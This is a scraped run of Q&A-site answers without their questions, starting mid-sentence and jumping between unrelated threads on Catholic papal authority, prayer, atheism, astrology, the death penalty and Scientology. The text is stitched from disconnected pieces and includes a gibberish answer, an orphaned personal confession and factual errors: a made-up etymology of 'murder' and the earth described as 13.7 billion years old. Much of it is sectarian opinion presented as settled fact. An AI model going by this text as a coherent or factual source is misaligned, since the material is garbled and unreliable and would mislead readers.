morals is called "infallibility" (it has nothing to do with the sinfulness of the Church's leaders, which deals with "impeccability"). If the Church were not infallible, the powers of death would indeed prevail over her sinful members. The consistent, 2,000 years of the Churchs teaching on faith and morals proves that Jesus has kept His promise.     Third, Jesus gives Peter the keys to the kingdom of heaven. While many Protestants think that the gift of the "keys" means that Jesus appointed Peter as the guardian of the gates of heaven, the "keys" actually refer to Peter's authority over the earthly Church (which Jesus often described as the "kingdom of heaven." Matthew 13:24-52; 25:1-2; Mark 4:26-32; Luke 9:27; 13:19-20, etc.) In the Old Davidic kingdom, the king had a prime minister on whose shoulder God placed the keys of the kingdom (Isaiah 22:22). Similarly, the new kingdom of Christ also has a prime minister (Peter and his successors) who is given the keys of the kingdom. The keys not only represent the authority the prime minister has to rule over God's people in the king's absence, but also the means of effecting dynastic succession to the prime minister's office (for example, in Isaiah 22:20-22, Eliakim replaces Shebna as prime minister in the Old Davidic kingdom). Only the Catholic Church claims and proves a succession of prime ministers (popes) all the way back to Peter, and this succession is facilitated by the passing of the keys of the kingdom.     Finally, Jesus declares to Peter that whatever he binds and looses on earth will be bound and loosed in heaven. As in the Old Davidic kingdom, whenever Peter the prime minister opens, no one shall shut, and whenever he shuts, no one shall open. Jesus, therefore, gives Peter the authority to make decisions that will be ratified in eternity. In order for sinful Peter (and his successors through the passing on of the "keys") to make such decisions, he must be divinely protected. Once again, this evidences Jesus' gift of infallibility to the Church. Only the Catholic Church claims and has proven that her 2,000 year-old teachings on faith and morals, which have never changed, are infallibly proclaimed.

God had told them that the price for sin would be death (not hell take note).    Yet nine times out of ten, God works by natural law.  He didn't strike them dead on the spot.  Maybe he manipulated their perfect DNA to what is is today, made us susceptable to disease and old age.  We are their offspring, so of course we inherited their faulty DNA.    Question is why?  Why wouldn't he strike Adam and Eve right then and there, create two  more perfect humans and case closed?  Because God is Justice.  The major question raised in the Garden would never be answered.  Can humans become gods themselves (in being able to set the standard of what is right and wrong in their eyes alone, without God)?  In my opinion, God let us prove to him and to the spiritual word and mostly to ourselves if we can do this.  He, of course, took precautions.  He limited our life span.  Can you imagine what we would do to the planet if we lived longer?  In just a century we have managed to destroy this planet by 'doing what is right in our eyes'.  He also made provision that each and every one of us who pays the price of sin (death) will be resurrected under the Kingdom.  The NT speaks of resurrection of the 'righteous AND the unrighteous'.    The starving Mabu in Africa is proof that we humans cannot govern ourselves without the help of God.  It's blaring evidence that we were wrong.  But that starving Mabu will rise and live again, under the Kingdom of God (I believe it will be on earth, not heaven.  Didn't read about Jesus resurrectin folks in heaven.  He brought them back to earth).    (((Kitteh)))|`|t3W4h59haa	I know. That bastard.|`|7ff82885c9d5d1f343a4664e9d97a78aaa	What are you afraid of?  Find out for yourself.

Either you can trust Him, and know beyond any shadow of doubt that your prayers have been heard, that God cars about you and your circumstances and that He really is in control...or you can insist that you are on your own, and you have to solve your own problems even though you have NO clue what's up ahead for you, or what is the best choices for you.

True prayer is, "Thy WILL Be Done".... Peace and Blessings....|`|9mLjDa5kaa	Do you believe that Jesus is God?  Do you believe that the ONLY WAY to get into heaven is by believing in Jesus without adding any of your own works?     If you don't believe these things, then you won't get very much.     Salvation is a FREE GIFT that happens in a split second when you believe in Jesus! It is impossible to lose or "leave" salvation.     The truth about Jesus is that the only way to be saved and to get into heaven and avoid being sent to eternal hell, is by believing in faith alone that Jesus, who is God, died for our sins on the cross as FULL PAYMENT for all our sins, and then Jesus rose from the dead (1 Corinthians 15:1-4). Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead. Thank You for eternal life!" You will be in heaven with Him forever when you die. :)|`|IbtQ5IKNaa	Depends if your using your heart to that one and only diety.  Depends on if you made him up or not.

They will come from high above, we always knew that.|`|3180e2b368500ca94cbac1a023253d3caa	Free will goes like this:    "Does God know everything that is going to happen? - Does He have absolute control on the outcome of everything? - If so, how is that fair for us? Where is our free will then?    Allah knows everything that will happen. The first thing that He created was the "pen" and He ordered the pen to write. The pen wrote until it had written everything that would happen. And then Allah began to create the universe. All of this was already known to Him before He created it. He does have absolute and total control at all times. There is nothing that happens except that He is in total control of it at all times.    ..Allah accepts the repentance of whom He wills. Allah is All-Knowing, All-Wise.  [Noble Quran 9:15]      ..Truly He! Only He, is the All-Knowing, the All-Wise.    [Noble Quran 12:100]      And Allah only, has Free Will, He Wills whatever He likes and it will always happen as He wills. We have something called, "Free choice." The difference is that what Allah "Wills" always happens and what we choose may or may not happen. We are not being judged on the outcome of things, we are being judged on our choices. This means that at the core of everything will always be our intentions. Whatever we intended, is what we will have the reward for. Each person will be judged according to what Allah gave them to work with, how they used it and what they intended to do with it.    As regards the actual "Judgment Day" - Allah tells us that everything we are doing is being recorded and not a single tiny thing escapes from this record. Even an atom's weight of good will be seen on the Day of Judgment and even a single atom's weight of evil will be seen too.    On That Day (of judgment) mankind will proceed in scattered groups and they will be shown their deeds.    So whoever does good equal to the weight of an atom, shall see it.    And whoever does evil equal to the weight of an atom, shall see it.  [Noble Quran 99:6-8]      The one who will bring the evidences against us will be ourselves. Our ears, tongue, eyes and all of our bodies will begin to testify against us in front of Allah on the Day of Judgment. None will be oppressed on that Day, none will be falsely accused.    He could have put everyone in their respective places from the very beginning, but the people would complain as to why they were thrown in Hell without being given a chance. This life is exactly that; a chance to prove to ourselves who we really are and what we would really do if we indeed had a free choice.    Allah Knows everything that will happen, but we don't. That is why the test is fair."    And don't expect god to answer prayers just because you prayed, that would be a type of arrogance that you must avoid at all times.    If something bad's going on,view it as a test form God, to see what you will do.|`|7422ddf097669bd7b6e3d48e56258b87aa	http://douglawrence.wordpress.com/2009/0...|`|Is5zKxntaa	It happens while you least expect it|`|YCAGrOdGaa	because god bgvfxduigrteiughiutghru gfiutrkjghb7ogbg6jiuy|`|zIXReHyTaa	Ask and you shall receive.  Not always straight away, be patient.  Read the law of attraction as it shows how God's model of the Universe he set up works.  I reckon it's automated, so if you are praying for something then start thinking I'm never going to get that though...  then the negative thoughts will also be sent out and cancel it.  So once you put your order in to the Universe that God has created, believe that you will get what you asked for...wait ...and you shall receive. You will attract back things on a similar wavelength.  Now by asking this question you have doubted God's will.  And that is why it is so important to have faith.  Try it with something small and then work your way up to the big things.  Good luck.|`|mYpVOSKfaa	When you pray, and it seems that God doesn't answer, it might be that He is subtly saying "no", but at the same time, you do have the option to do it, or have the thing you prayed for.  God will allow us to have our way, if we insist on it; after all, He is God, and He really does know what's best for us.  He also knows the future, and what the consequences of our actions will be.|`|jdRKZe18aa	God sees the "big picture" the eternal perspective.  He isn't a Geni who gives us our every WISH.   God explains that "I am bound  when ye do what I say.  When ye do not what I say ye have no promise."  HE is bound by eternal laws as well. Blessings come to us naturally as we DO GOOD, live right, obey God, love others, purify our hearts, repent of sin....      When we pray we should give thanks very specifically to the Lord for what we have, what we are, all the beauties, wonders & positive things iN LIFE, we should ask for guidance, direction , help, aid, pray for those we love, ask for help, express our feelings of all kinds, honor & worship His Holy name and gratitude for His Son....  If we are asking Him for favors and material things that we hope HE MAGICALLY grants - that just isn't how HE OPERATES.  Ultimately HIS WILL is done in all things and we should humbly acknowledge this in our lives & prayers.|`|D9lMg7A2aa	Maybe as your just punishment you will get your prayer answered and regret it. IT is a very common experience. Did you ever wonder where Truman Capote got the title for his book, Answered Prayers ?    More tears are shed over answered prayers than unanswered ones. St. Teresa of Avila  (Spanish Nun, Mystic and Writer, 1515-1582)    Really, keep bending God's arm.

But anyway I've been hiding from everyone but but right now  I can't hide my my misery because there isn't a way to do it anymore but I can't say why I'm so upset all the time. and of course there's this boy and we all know this story.

The word murder is related, in old English, to the French word mordre (bite) in reference to the heavy compensation one must pay for causing an unjust death

Are you serious?    The major flaw in your logic is that the earth being 13.7 billion years old presents a major problem to the theists story, not the atheists. The whole Adam and eve story and what the bible claims is absolutely contradictory to what you have just consented to.  Are you saying that the bible is wrong?    Although science and atheism often complement each other, they do not go hand in hand. Atheists simply do not believe in the existence of some higher power. The Big Bang is a scientific theory and is not directly related to atheism. Your argument holds no bearing.    But, as long as you're being scientific, you might take the time to educate yourself on certain scientific matters such as evolution, dinosaurs, and the many other bits of scientific evidence that do prove that the creationist theory is a steaming load of dung.    And who exactly are the atheists that believe that everything must have a cause? I haven't met these atheists yet...|`|xRCynGQqaa	This would be true if atheists claimed to have perfect knowledge. We don't.     We don't know how the universe began. But just because we don't know the answer doesn't mean there isn't an answer. And it certainly doesn't mean that we need to fill this knowledge gap with a supernatural agency.    Furthermore you're working from a false premise. You claim that atheists "have a belief" that there are no god/s. Wrong. We have "no belief" that there are god/s (ie. not a negative belief "ignoring evidence", but the absence of a belief "due to a lack of evidence"). A subtle difference, but an important one.|`|bfQGXi9zaa	The problem here is that you are applying only early to mid 20th century physics to the problem of universal formation.    Current quantum theory is now viewing the universe as a repeating quantum event. If such is the case, then there is no definitive beginning or ending for the universe. Remember, 'beginning' and 'end' are simply conceptual ideas formed from human observation.    You are also incorrect when you state, in your last paragraph, that :"1) all beliefs must be supported by observational evidence, and 2) beliefs that contradict observational evidence cannot be tolerated."  This has never been an absolute within human the history of human perception. There was a time when it was believed that natural phenomenon such as rain, wind, lightning, etc. were caused by gods and deities. There was zero observational evidence for this belief...it was simply predicated by the fact that primitive man had no other viable explanation because he LACKED the technology and methodology to observe such phenomenon any other way.    In addition, who said that that life can exist only within very narrow ranges? There is only one planet that we know have so far that has life..ours.  We know the ranges and conditions for life on this planet to exist, i.e., the conditions necessary for life as WE know it. For all we know, there may very well be thousands of other planets out there that have living beings on them, but not in the way we understand life. For example, the animal life on this planet is carbon based, but there may be another world out there where the life is silicon based. Since we are not sure as to why consciousness and sentience even occurs, there may very well be a wide range of possibilities that allow for conscious sentience. We are limited in our understanding of life as we only know life as it exists on Earth.|`|52246014c6731089215da64339f2d610aa	Maybe.|`|aBHY2iXraa	Bottom line: There is no evidence for God's existence.

Does that say anything about your worldview?|`|Kbry7CnOaa	The Universe is eternal, the 'Big Bang' was merely the start of the universe HOW WE KNOW IT. Your 'Big Crunch' theory has not been shown to be false, merely it has just been shown not to have happened exactly how theorists first envisaged, but that is beside the point.    You may also want to consider that life may simply not have started, or started in a very different way, or on another planet if the conditions had been different. And your assumptions about matter are false. Matter can exist in a very wide range of conditions.    You also assume that even if there was a God, that he would not use naturalistic means to bring the universe (as we know it) into existence. Possibly you should define what you mean by 'naturalistic'. Just because something has not been observed by you on this planet, or it has yet to be theorised or proven to be possible, that it is somehow not natural.    Atheists, strong or weak, discount most strongly the Biblical God. The assumption that if there is a God, that he would behave in a way described in the Bible is not only illogical but unlikely. Which is why they do not break your 'rules' governing skeptics and atheists. Rule one is false anyway, as much of science theory has not been observed, merely theorised and shown to be the most likely means by which something has come about.    So where exactly did you 'cut and paste' this Christian propaganda piece from anyway....?

There's the polity and administrative part (the church)  (the religious hardware, so to speak), and then there's the heart of the Church -- the people who make up the Body of Christ on earth (the religious software).|`|h5q89E3Haa	Number of Times "Church" is mentioned in the new testament: 76  Number of Times "Invisible Church" is mentioned: 0    Matthew 16 Christ told St. Peter (the Rock) he would build his Church upon that Rock, He gave St. Peter the Keys to the Kingdom and the Authority that what he bound on Earth would be Bound in Heaven and whatever he Loosed on Earth would be Loosed in Heaven.    The Pope is St. Peter's successor and Jesus made the rules. So if you have a problem with them take it up with Christ.    If the Church is the People then you must explain the following:    Where did St. John send the 7 letters to the 7 Churches it the true church is just a group of people with out a leader?    Why there are 40,000 different Protestant sects. Which one is right if the Holy Spirit inspires without error and God is not the God of confusion?

The Pope doesn't "make the rules" quite like you are wording it- and he doesn't receive it from the press. It is God's word.    Just wondering, where did you hear this? Just curious.|`|415b73f4e9911495575d995988a025aeaa	Umm... no. There is only one Catholic church. Everybody belongs... the Pope, the rest of the clergy, and the laypeople, are all part of the Family of God, the Catholic Christian Chruch, the One Chruch that Jesus Himself established.    By the way... the beliefs spelled out in the Catechism are supposed to be accepted by all Catholics. Becoming Catholic means that you accept ALL of The Lord's teachings. Note, though, that the clergy does not "make the rules". Only God presents religious truth. Not a human... not a priest... not a fundie. However, God works through the church that His Son established.    The interpretation you have spelled out is probably the farthest possible scenario from the true Catholic Church. This is, in fact, the way fundies practice, and it is why there are over 38,000+ denominations of Christianity today. Sadly, they lack the central, divinely guided authority the Catholics are blessed with.|`|AA11440601	The Catholic Church is One.    The people and the hierarchy are part of the Church that is filled with the Holy Spirit.    Church is the assembly of the People that God has called together from the ends of the earth.    In Catholic usage, the word "Church" has three inseparable meanings:   ? The People that God gathers in the whole world  ? The local church (diocese)  ? The liturgical (above all Eucharistic) assembly    The Church draws her life from the Word and the Body of Christ, and so herself becomes Christ's Body.    In the Nicene Creed (from 325 C.E.), the Church is professed to be one, holy, catholic, and apostolic.    A church is a building where "the" Church comes together to worship God.    With love in Christ.|`|74b1131cf5ddd01a70564ef108e130bfaa	Kind of.     But not in the sense that the big boys make all the rules, and those of us in the trenches quietly go about putting our own spin on their pronouncements to suit ourselves.    No, there's something much more positive at work within the body of Christ that is the Church, and that's the "sensus fidelium" or "sense of the faithful" (sometimes called "infallibility of the laity", though with the expected accompanying confusion among non-theologians over precisely what that means; people have enough of a problem understanding the scope of papal infallibility, let alone this), in which teachings and at times even doctrines of the Church do not originate so much from the top down as from the bottom up, though they are ultimately legitimized and made official only by the Magisterium.     The most commonly referenced example of sensus fidelium in action is the doctrine of the Assumption.     I cannot in good conscience attempt a full explanation that would do this justice, but I can recommend some preliminary reading.      Pp. 897-913 of the Catechism of the Catholic Church  "Lumen Gentium" (Vatican II document, link below)  John Henry Newman: "On Consulting the Faithful in Matters of Doctrine" (2nd link below)    While these are ponderous at times, particularly the last two, it's really necessary to get the big picture.  But suffice it to say for the moment that the laity -- the mass of the faithful -- are of much greater significance to the Church than simply the people whose job it is to "pay, pray, and obey".    You could also search on "sensus fidelium", mindful that the sources found should be taken only as opinion unless they're obviously from the Holy See or have an imprimatur.|`|AA11796124	There is only One Catholic Church.|`|i6Mi8uWIaa	No, there is only one Catholic church.    Now, there are sects out there that call themselves the "True Catholic Church" (this is Mel Gibson's sect, and they elected themselves an anti-Pope just a few years ago up in a secret enclave in Montana) and there is a sect that calls itself the "American Catholic Church" (no known leader, but they claim to have apostolic  succession from Andrew, and their priests can be married), along with various other sects that call themselves Catholic but are not.     However, there is only one holy Catholic and apostolic church, and that is the Church made up of the people and led by the Pope in Rome.|`|3306acbb7100c0f39897a04c473a7708aa	I was just having a discussion about the catholic church with a 16 year old gay friend of my daughters.

I don't think its accurate to say that there are two churches rather that there are two facets to the One, Holy, Apostolic & Catholic Church.    While no doubt doing grave injustice to Lumen Gentium, it can be paraphrased to say that the laity hold a very important role in the preservation of the Deposit of Faith (as does the other 'facet', the ordained).    As far as beliefs matching or not, it would depend on which specific beliefs are in question. Contrary to popular belief, there is a great deal of latitude in many areas which results in a mosaic of beliefs among the Catholic faithful. One such belief is concerning the diversification of life. The Church itself has not defined any doctrines concerning this and so each and every individual Catholic, after diligent study and prayer of course, is expected to form their own opinion as to whether life evolves or whether all contemporary life was created verbatim as dictated in Genesis. Other beliefs (properly called dogmas) are strictly defined and are found at the very heart of *being* Catholic. Such beliefs include the virgin birth of Jesus, the immaculate conception of Mary, the passion, the resurrection, Jesus' real presence in the Eucharist (communion), etc.     Then there are the *hotly contested* beliefs which many bishops and theologians are still arguing over. I say these are hotly contested because at the heart of the argument is whether the Church has historically defined any of these beliefs. Some Catholic theologians and Bishops argue that the Church's teachings on sexuality are infallible and defined via perpetual instruction while others argue that the Sacred Tradition is rather sketchy on such teachings and so more properly belong in the same "camp" as organic evolution. There is an *official* teaching (given to us by the Ordinary Magesterium) but some Catholics feel that in time these teachings will become better developed and so for now they dissent.    Catholic theology, as anyone could see, is very complex and difficult to sum up in a short answer, but I'm glad you asked this question. Too often folks forget that (though there are not two churches) there is much more to the ONE church than just the Pope and Cardinals.

7422ddf097669bd7b6e3d48e56258b87aa	"Works" most correctly refers to "works of the old law", law which is no longer in effect under the New Covenant.     So the point is really moot.    Jesus is on record as emphasizing both that which only he can do, and that which we as Christians are called and obligated to do.    In the end it comes down to loving God and loving our neighbor, while trying to avoid being overly self centered ... all for Christ's sake.

Once the person has become a Christian by grace through faith, then he/she is to live in obedience to God and do the work that God has provided for them to do.

The questions usually asked are:-    1) Did Jesus really exist?  2) Is Jesus God?  3) If Jesus is God, then why did He keep praying to the Father in Heaven? How can the Father and Jesus be one God? Why did Jesus have to suffer on the Cross?  4) What is the Holy Spirit?  5) What is so special about Jesus? Why cant I just view him as an ordinary man or a teacher or a prophet? Why should I see him as God?      It would not be possible to give a short answer to these questions .    I suggest you visit the below website.    After visiting the below website, you would get a lot of answers.    http://jesustrinity.blogspot.com    1.Thomas calls Jesus God in John 20:28 (Note, Thomas addresses Jesus  specifically.)  2. Jesus is God in Heb. 1:8  3. John the apostle states that Jesus was the Word which was God that became  flesh (John 1:1-14)  4. The phrase "Call upon the name of the LORD" (Hebrew, YHWH, i.e., Psalm  116:4) used only of God on the OT, and translated into the Greek in the LXX as  "Call upon the name of the LORD (greek, KURIOS)," applied to Jesus in the NT  (1 Cor. 1:2) Jesus is God in flesh  5. The apostle John says that Jesus was , "...calling God His own Father,  making Himself equal to God," (John 5:18)  6. Jesus said that He and the Father are One (John 10:30), that caused the Pharisees to  claim that Jesus was making Himself out to be God.  7. Jesus knew all things (John 21:17)  8. Jesus knew all men (John 16:30)  9. Jesus is everywhere (Matt. 28:20)  10. Jesus Christ, dwells in you (Col. 1:27)  11. Jesus is the exact representation of the Nature of God (Heb. 1:3)  12. Jesus is eternal (Micah 5:1-2)  13. Jesus gives eternal life (John 10:27-28)  14. Jesus is our only Lord and Master (Jude 4)  15. Jesus is called the Mighty God (Isaiah 9:6)  16. Jesus is called the Mighty God (Isaiah 9:6) and "God" also be called the  Mighty God in Isaiah 10:21  17. Jesus is able to raise Himself from the dead (John 2:19-21)  18. Jesus created all things (Col. 1:16-17), it is God who created all things  by Himself (Isaiah 44:24)  19. Jesus searches the hearts and minds of the people (Rev. 2:23)  20. Jesus is worshiped (Matt. 2:2-11; Matt.14:33; Matt.28:9; John 9:35-38;  Heb. 1:6) Only God can be worshipped (Matt. 4:10) (same Greek word for worship  is used in each place.)  21. In the OT God was seen (Exodus 6:2-3;Exodus 24:9-11; Num. 12:6-9; Acts  7:2), yet no man can see God (Exodus 33:20; John 1:18). It was not the Father  that was seen in the OT (John 6:46). Who, then were they seeing? See John  8:58.  22. Jesus claimed the divine name, "I AM", for Himself in John 8:58 see  Exodus 3:14.  23. Jesus says you must honor him even as you honor the Father (John 5:23).  24. Jesus gives life (John 5:21).  25. Jesus bears witness of Himself (John 8:18;John 14:6).  26.

Lk4aCBACaa	Horoscopes? No. Astrology? Yes.    Astrology can be a very useful tool for understanding personality/psychological makeup, as well as how we interact with others and the life cycles we go through. For those who have not explored the subject, horoscopes are not all there is to astrology. Horoscopes only deal with a tiny part, the Sun, because that fits best in a small space and is easiest to look up. Astrology does NOT try to fit everyone into 12 boxes, and far from being purposely vague, most of you would be surprised by its complexity. A full astrological chart is based on the date, place and exact time of birth and you have a minimum of 7 planets, 12 signs and 12 houses, and the geometric relationships between them, as well as transits and progressions. Actual astrology is so complex that no one else will have the exact same chart as you do for millions of years. Contrary to popular belief, it has never been "debunked" by science because the ones trying to debunk it usually stop at the newspaper columns and never explore the subject in its entirety. And we also count among our number several doctorates and other highly-educated people who learned it so they could disprove it and found they were unable to.     Astrologers will differ on the hows and whys of astrology. I can only speak for myself. The stars do not make anything happen to you, they're only reflecting what is already happening via synchronicity. A good analogy is that a clock striking noon doesn't make you eat lunch, but it does make it a lot more likely than lunch will be had. I do not believe that astrology can predict specific events, only archetypal themes that will be in play. A particular aspect can play out in an infinite number of ways, but it can not "just mean anything," it will stick to the archetypal themes of the planets, signs, houses and aspects involved. In the last century or so, astrology has absorbed many psychological ideas, and I think this is one of its greatest strengths. Many psychological concepts, such as the midlife crisis, have an astrological correlate.    I haven't found the same level of complexity with numerology though; there's just not as many factors going into it which makes it a lot less specific to the individual. The temperments (melancholy, sanguine, etc.) were already included in astrology since ancient times; looking at them by themselves may be interesting, but not quite complete.|`|TnquzeM5aa	http://www.thebestpageintheuniverse.net/...|`|WalnRzfGaa	Astrology is garbage, it says me and my fiance are not a good match and that we should try and avoid each other. but i have never been more compatible with someone in my life.    its Malarky|`|AA11785285	Aw, come on....     you don't really believe your puny little life of a mere 80 years or so in the history of a universe of trillions of universes of trillions of years would at all be influenced by stars, or numbers or anything else spooky like that????

I think one of the better disproofs of astrology came from Carl Sagan in Cosmos: Astrology can be dis proven by twins. If one twin dies and the other one becomes successful, astrology can not work. If astrology works, how could they have lived such different lives even though they were born under the same set of stars?
ozwLZwXeaa	Not a kids question at all, I find it interesting for the reason that it is a part of our human experience.  Shows that our intuition is well and alive.  I have noticed too that when my dog did not warm up to some one, the dog was right and that person was up to no good.

When my son (who is now 17 and 6 months) was 4 years old we had a man come around our house to put new vertical blinds in all the windows as we had just renovated and turned our cottage into a duplex with another house in what was once our large backyard.    We had had many workmen around and 'The Weave' (my sons nick name) had loved to watch them and sometimes 'helped them' or just spoke to them.    This day my son had been playing in his room down the end of our long passage way, some distance from the blind installer.  The blind installer was polite, presentable and clean cut looking but something seemed to be on his mind troubling him and it showed in his abrupt manner and short replies.    After he had spoken a few words and found out where to do the work, my son came down from his room and said ''who are you, what are you doing here, I don't want you in my house, you are bad''.    I never use the word 'bad' with my children, preferring 'unacceptable behaviour' or 'not appropriate'.      My son has Aspergers autism and has beautiful manners and I have been told this by many people, including teachers, employers, friends and others.      He must have sensed that the young man was angry about something and wanted him out of the house quick smart.  Of course I tried to get my son to apologise to the man but he thought he was protecting me.    When I had to have the consultant back to order a door screen he said that the young workman had been very busy and tired from having a new baby.|`|acaJSqW6aa	Yup....I don't even have to see them in person.

The MAIN controversy here is that the death penalty used to be practiced before full legal liason could be accredited to the committer of the crime (ideally, those charged with death and thereby put to death were not fully proven guilty for the murder of another). And...things have changed since then. Time pends, and people rot either way. Here we have an imbalance. Our justice system is heavily flawed and sucks enough ballsack sweat to let an innocent person rot away and waste life; and vice-versa, in that those guilty either rot away as well or actually get sentenced the full death penalty. Given that informative disposition, I'd have to say my own preference in matters of choosing sides over the death penalty would reside...against it. The innocent are not sentenced to death and can be proven innocent still, while the guilty get their just desserts.|`|iImcqUmbaa	Yes, I noticed. I'm not sure why it "seems" so interested in that.

I'm sure I support some more subjects that depends what I interested for.    Importance noted - if somebody is a pro-life that does not make him/her a being uncaring person to women or girls, or stupid, or illogical, or etc etc.     Well... Why cannot pro-lifers care for both unborn children and women? Are you not allow pro-lifers to have a feel for women and girls, aren't ya? Do I have to be pro-choice if I am a logical?? Well, I'm not surprise many pro-choicers just assume alot/all pro-lifers don't care about women and girls, are illogical, wacko religious, and so on...

6064bd72a9d33a8f2e618cc79b0f9629aa	It's a cult.    Scientology, which questionably calls itself a new "religion", is the brainchild of 1950s science fiction writer & occult enthusiast L. Ron Hubbard. The organization, by means of Hubbards self created psychotherapy technique called Dianetics, claims to be able to help rid members of any & all mental constraints including but not limited to emotional scarring (from this & "past" lives) due to "engrams" (past negative experiences stored in our unconscious mind), psychological disorders & chemical imbalances (the solution is to convince members that these things don't actually exist) & drug dependence (including legally prescribed psychopharmaceuticals which counteract the effects of psychological disorders Scientologists believe to be nonexistent). Their treatment of substance abuse includes little more than massive, often dangerous doses of vitamins and unhealthy extended sessions in a sauna.   http://en.wikipedia.org/wiki/Dianetics S...   Dianetics review: http://dir.salon.com/story/books/review/...   http://www.time.com/time/magazine/articl...   http://www.cs.cmu.edu/~dst/Narconon/deto...   http://www.nypress.com/20/22/news&column...     Scientology is most certainly NOT a religion. In fact, one of the only reasons they enjoy "tax exempt status" on religious ground in the United States is because they bullied the IRS into a "deal" through extremely aggressive barratry (which is the offense of persistently instigating groundless lawsuits) against said government agency & its officials, & arranged to drop all 2,500 frivolous lawsuits only when an "agreement" was reached. In addition, Scientology's lawyers hired private investigators to dig up any "dirt" on IRS agents which was then used to blackmail or publicly smear all "vulnerable" agents. It was an all-out WAR that Scientology had waged against the IRS, & was even described as such by Scientology's "CEO", David Miscavige, in his 1993 speech to the International Association of Scientologists.   http://legalminds.lp.findlaw.com/list/fe...   http://www.lermanet.com/scientologynews/...   http://www.factnet.org/headlines/give-aw...   http://www.cs.cmu.edu/~dst/Cowen/essays/...     The official Scientology organization is composed of a number of levels. One begins as a preclear & works their way up. One must purchase virtually every service crucial to advancement directly from the "church" & at staggering prices. "Auditing", for example, is purchased in 12? hour blocks, costing anywhere from $200-$750 for introductory sessions to between $8,000 & $9,000 for advanced sessions. Basically, Scientology claims to possess exclusive knowledge of the path to religious redemption & then charges obscene amounts of money for every tiny incremental step towards this end. Visit this link to see how $380,000 is a conservative estimate for the total cost of moving all the way up the Scientology hierarchal ladder:  http://www.xenu.net/archive/prices.html   These are the total costs for auditing alone:   http://en.wikipedia.org/wiki/Scientology...   Heres an explanation of what auditing is:   http://answers.yahoo.com/question/index?...     At level OT III (Operating Thetan Level 3), some very strange & fiercely guarded secrets are imparted upon worthy members who have paid enough money to advance to such a level (and no, this isn't a joke): The evil alien ruler Xenu killed millions of aliens (Thetans) from around the universe by kidnapping them, bringing them to earth in golden DC-8 space-planes, stacking them around volcanoes & blowing them up by dropping h-bombs into the volcanoes. Scientologists believe the souls of these aliens (these souls are "Body Thetans") were captured, brainwashed & released; they then attached themselves to our ancestors (and according to Scientologys belief in Thetan immortality, they also attached to us during past lives) & cause many of our mental & physical ills to this day. Auditing is said to clear us of these Body Thetans as well as the mental implants they supposedly impose on our minds.  http://www.spaink.net/cos/essays/atack_o...   http://sf.irk.ru/www/ot3/spaink-ot3.html   http://xenu.net/archive/leaflet/Xenu-Let...   http://www.cs.cmu.edu/~dst/OTIII/     Scientology has taken a very hostile stance towards psychiatry & psychiatric drugs irrespective of the fact that some people require medication to remain adequately functional during everyday life.

Answer: Since its founding in 1953, Scientology has presented the question of whether or not it is compatible with Christianity or whether it is a cult. The increased popularity among celebrities adds to it mystique and Christians wonder how much of Scientologys teachings are biblical.     Scientology is a very difficult religion to summarize in just a few paragraphs. It was founded in 1953 by fiction author L. Ron Hubbard, just four years after he made the statement, "I'd like to start a religion. That's where the money is," to Lloyd Eshbach; quoted by Eshbach in Over My Shoulder. That is indeed where he found wealthHubbard became a multi-millionaire. An easier question to ask would be, "What are the similarities between Christianity and Scientology?" The answer to that would be, "There are none."    Scientology teaches that mankind is an immortal being (called a Thetan) not originally from this planet who is trapped by matter, energy, space, and time (MEST). Salvation for a Scientologist comes through a process called 'auditing,' whereby 'engrams' (basically, memories of past pain and unconsciousness that create energy blockage) are removed. Auditing is a very lengthy process and can cost hundreds of thousands of dollars. When all engrams are finally removed, the Thetan can once again control MEST instead of being controlled by it. Until salvation, each Thetan is constantly reincarnated.    Scientology is a very expensive religion to associate with. Every aspect of Scientology has some sort of fee associated with it. This is why Scientology's "pews" are filled only with the wealthy. It is also a very strict religion, and very punitive against those who would try to leave behind its teachings and membership. Its "scriptures" are limited solely to the writings and teachings of L. Ron Hubbard.    Scientology is, without a doubt, a cult. Its teachings are taken from science fiction and eastern mythologies; it promotes man as the ultimate power in the universe (he just hasn't realized it yet); salvation comes through an extremely expensive process of mind games; and it categorically denies the existence of the God of the Bible, heaven, and hell. To a Scientologist, Jesus Christ was just another nice guy who unfortunately was wrongfully put to death and whose story ends at that death.    Though Scientologists will claim that Scientology is compatible with Christianity, the Bible counters each and every point of belief they hold to: God is the sovereign and only creator of the universe (Genesis 1:1); mankind was created by God (Genesis 1:27); the only salvation available to man is by grace through faith in the finished work of Jesus Christ on the cross (Philippians 2:8; Acts 4:12); salvation is a free gift that mankind can do nothing to earn (Ephesians 2:8-9); and Jesus Christ is alive and well and seated at the right hand of God the Father even now (Acts 2:33; Ephesians 1:20; Hebrews 1:3), awaiting the time when He will gather His children to Himself to reside with Him for eternity in heaven. Everybody else will be cast into a very real hell, separated from God (Revelation 20:15).    Scientology differs from biblical Christianity on every important doctrine. Some of the most important differences are summarized below.    God: Scientology believes that there are multiple gods and that some gods are above other gods. Biblical Christianity, on the other hand, recognizes the one and only true God who revealed Himself to us in the Bible and through Jesus Christ (Hebrews 1:1-2). Those who believe in Him cannot believe the false concept of God as taught in Scientology.    Jesus Christ: Like almost all other cults, Scientology denies the deity of Christ. Instead of having a biblical view of who Christ is and what He did, they assign to Him the characteristics of some sort of lesser god who has obtained a sort of legendary status over the years. On the other hand, the Bible clearly teaches that Jesus was God in the flesh and through His incarnation He could act as a sacrifice for our sins. It is through Christs death and resurrection that we can have the hope of eternal life with God.    Sin: Scientology believes in the inherent goodness of man and that it is despicable and utterly beneath contempt to tell a man he must repent, that he is evil. On the other hand, the Bible teaches that man is a sinner and the only hope for him is to repent of his sins and acknowledge Christ as his Lord and Savior.    Salvation: Scientology believes in reincarnation and that personal salvation in one's lifetime is freedom from the cycle of birth and death associated with reincarnation. They believe that religious practice of all faiths is the universal way to wisdom, understanding, and salvation. On the other hand, the Bible teaches that there is only one way of salvation and that is through Jesus Christ. Jesus Himself said, I am the way, the truth, and the life, no man comes to the|`|18a5331fc23bba2ade711a68568a2f8faa	Sure charlie Brown. a man who was a fiction writer boasted he could make more money starting a religion.

